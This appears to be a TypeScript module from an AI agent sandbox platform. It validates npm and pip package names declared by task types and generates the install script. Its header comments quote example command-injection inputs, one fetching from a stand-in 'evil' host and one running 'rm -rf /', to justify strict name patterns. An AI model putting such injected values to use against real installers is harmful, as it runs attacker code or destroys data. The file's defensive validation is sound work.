// What a job needs in the sandbox that the image does not already carry.
//
// ═════════════════════════════════════════════════════════════════════════════════════════════════
// WHY A TASK TYPE GETS TO ASK
// ═════════════════════════════════════════════════════════════════════════════════════════════════
//
// The sandbox image is one image for every shape and every trade, and that is the right default —
// `sandbox.snapshot.ts` argues it: "one snapshot that can do everything beats a matrix of snapshots
// whose differences somebody has to remember."
//
// It stops being right the moment a trade needs a library nobody else does. A wedge that produces
// motion graphics needs a rendering library; one that reads spreadsheets needs a parser; one that
// makes charts needs a plotting library. Baking every one of those into the shared image makes the
// image enormous for the runs that will never touch them, and NOT baking them means those trades
// cannot be fitted at all — which is the constraint `FITTING-A-TRADE.md` exists to remove.
//
// So a task type declares what it needs and the kernel installs it before the agent's first turn.
//
// ═════════════════════════════════════════════════════════════════════════════════════════════════
// A PACKAGE NAME IS DATA, AND THAT IS THE WHOLE SECURITY ARGUMENT
// ═════════════════════════════════════════════════════════════════════════════════════════════════
//
// The obvious objection is that installing from a manifest is running somebody's code. It is — and
// it is not a NEW capability, because the sandbox already runs an agent that holds `bash`. Anything
// a declared package could do, an agent could already do by typing the install itself. What this
// changes is that it happens once, before the run, where it can be reported and bounded, rather than
// as a surprise mid-task.
//
// What WOULD be new is a manifest smuggling a flag or a shell. `npm i react --foo=$(curl evil)` and
// `pip install x; rm -rf /` are not package names, and the difference between a name and a command
// is the only thing standing here. So the patterns are strict to the point of rudeness: letters,
// digits, and the handful of separators real package names use. No spaces, no slashes except a
// leading npm scope, no flags, no URLs, no local paths, no git refs, and — the one that matters most
// — no semicolon anywhere, which is what rules out a pip environment marker along with everything
// else that turns an install into two commands.
//
// A name that fails is REFUSED AND REPORTED, never sanitised into something adjacent. Quietly
// installing `rm-rf` because somebody wrote `rm -rf` would be the worst of both.
//
// ═════════════════════════════════════════════════════════════════════════════════════════════════
// AND A WRITTEN SERVICE MAY NOT ASK AT ALL
// ═════════════════════════════════════════════════════════════════════════════════════════════════
//
// `wedgeauthor.ts` refuses this field, and that refusal is a different question from the one above.
// A hand-authored manifest is a human deciding their trade needs a library; an authored one is a
// MODEL choosing what to install, which is a supply-chain decision made by something that cannot be
// asked why. Same reasoning that refuses `workspace` there.

/**
 * Letters, digits, and what real package names actually contain — PER ECOSYSTEM, because they differ.
 *
 * One pattern was wrong and the test caught it: npm pins with `@` (`xlsx@0.20.3`, and a scope is a
 * second `@` plus a slash), pip pins with `==` (`pandas==2.2.0`). A single regex either rejects every
 * pinned Python package or accepts an `@` where pip does not mean one.
 *
 * Both are deliberately narrower than the registries allow. A name either rejects is a name somebody
 * should write out longhand in the image, and the cost of being too strict is a refusal with a
 * sentence — against a cost of being too loose that is arbitrary code carrying a manifest's authority.
 *
 * Pip ranges (`>=`, `~=`) are accepted alongside `==` because they are what requirements files
 * actually contain, and refusing them would push authors toward pinning versions they have not
 * tested. Nothing here accepts an UNBOUNDED comparison chain or an environment marker: those carry
 * semicolons, and a semicolon is the thing this whole file exists to keep out.
 */
const SAFE_NPM = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*(@[a-zA-Z0-9][a-zA-Z0-9._+-]*)?$/;
const SAFE_PIP = /^[a-zA-Z0-9][a-zA-Z0-9._-]*((==|>=|~=)[a-zA-Z0-9][a-zA-Z0-9._+-]*)?$/;
const SAFE_NAME: Record<"npm" | "pip", RegExp> = { npm: SAFE_NPM, pip: SAFE_PIP };

/** Enough for a handful of libraries; not enough to build a distribution inside a task. */
export const MAX_PACKAGES = 12;

/** Node and Python. Both are already in the image, so neither adds a runtime that was not there. */
export interface Packages {
  npm?: string[];
  pip?: string[];
}

export interface PackageFault {
  ecosystem: "npm" | "pip";
  name: string;
  why: string;
}

/**
 * Read a manifest's `packages`, keeping only what is unambiguously a package name.
 *
 * Returns the faults alongside, because a silently dropped dependency is a run that fails later
 * doing something unrelated — the agent reaches for a library that was declared, is not there, and
 * spends its budget working out why.
 */
export function readPackages(raw: unknown): { packages: Packages; faults: PackageFault[] } {
  const faults: PackageFault[] = [];
  const out: Packages = {};
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return { packages: out, faults };

  for (const ecosystem of ["npm", "pip"] as const) {
    const list = (raw as Record<string, unknown>)[ecosystem];
    if (list === undefined) continue;
    if (!Array.isArray(list)) {
      faults.push({ ecosystem, name: String(list), why: "must be a list of package names" });
      continue;
    }
    const kept: string[] = [];
    for (const item of list.slice(0, MAX_PACKAGES + 1)) {
      const name = typeof item === "string" ? item.trim() : "";
      if (!name) {
        faults.push({ ecosystem, name: String(item), why: "is not a name" });
      } else if (!SAFE_NAME[ecosystem].test(name)) {
        // Named rather than sanitised. See the header: installing something adjacent to what was
        // asked for is worse than refusing.
        faults.push({
          ecosystem,
          name,
          why: "is not a plain package name — no flags, URLs, paths or shell are allowed here",
        });
      } else if (kept.length >= MAX_PACKAGES) {
        faults.push({ ecosystem, name, why: `is past the limit of ${MAX_PACKAGES} packages` });
      } else {
        kept.push(name);
      }
    }
    if (kept.length) out[ecosystem] = kept;
  }
  return { packages: out, faults };
}

export const hasPackages = (p: Packages | undefined): boolean =>
  !!(p?.npm?.length || p?.pip?.length);

/**
 * The shell that installs them, as a script to be written to a file and run by path.
 *
 * NOT interpolated into a command, for the reason `verifyWorkspace` documents at length: Daytona
 * hands an exec string to a shell we do not control, and every quote here would close its wrapper.
 *
 * Under the workspace lock, because `startPreview` and `workspace.verify` both run `npm install` in
 * the same sandbox and a third concurrent npm writing `node_modules` corrupts it — the exact failure
 * `WORKSPACE_LOCK_DIR` was created for.
 *
 * `--prefix /root` for npm so the modules land where Node resolves them from the agent's working
 * directory, matching how the image installs Playwright. `--break-system-packages` for pip because
 * Debian marks its system Python externally-managed; the alternative is a venv the agent then has to
 * know the path of, and a library the agent cannot import is a library nobody installed.
 */
export function installScript(p: Packages): string {
  const lines: string[] = [];
  if (p.npm?.length) {
    lines.push(`echo "mycel: installing ${p.npm.length} npm package(s)"`);
    lines.push(`npm install --prefix /root --no-audit --no-fund ${p.npm.join(" ")} 2>&1 | tail -20`);
    lines.push(`[ "\${PIPESTATUS[0]}" = "0" ] || { echo "mycel: npm install failed"; exit 1; }`);
  }
  if (p.pip?.length) {
    lines.push(`echo "mycel: installing ${p.pip.length} pip package(s)"`);
    lines.push(
      `python3 -m pip install --no-cache-dir --break-system-packages ${p.pip.join(" ")} 2>&1 | tail -20`,
    );
    lines.push(`[ "\${PIPESTATUS[0]}" = "0" ] || { echo "mycel: pip install failed"; exit 1; }`);
  }
  return lines.join("\n");
}

/**
 * What the agent is told is available.
 *
 * The same argument as `describeShipContract` and `BROWSERUSE_BRIEF`: a capability an agent does not
 * know it has is a capability it does not use. A wedge that declares a charting library and never
 * mentions it gets runs that describe a chart in prose.
 */
export function describePackages(p: Packages): string[] {
  const lines: string[] = [];
  if (p.npm?.length) {
    lines.push(
      `These Node packages are installed and importable in this sandbox: ${p.npm.join(", ")}. ` +
        `They were put there for this job — use them rather than writing the same thing by hand.`,
    );
  }
  if (p.pip?.length) {
    lines.push(
      `These Python packages are installed: ${p.pip.join(", ")}. Run Python with \`python3\`.`,
    );
  }
  return lines;
}
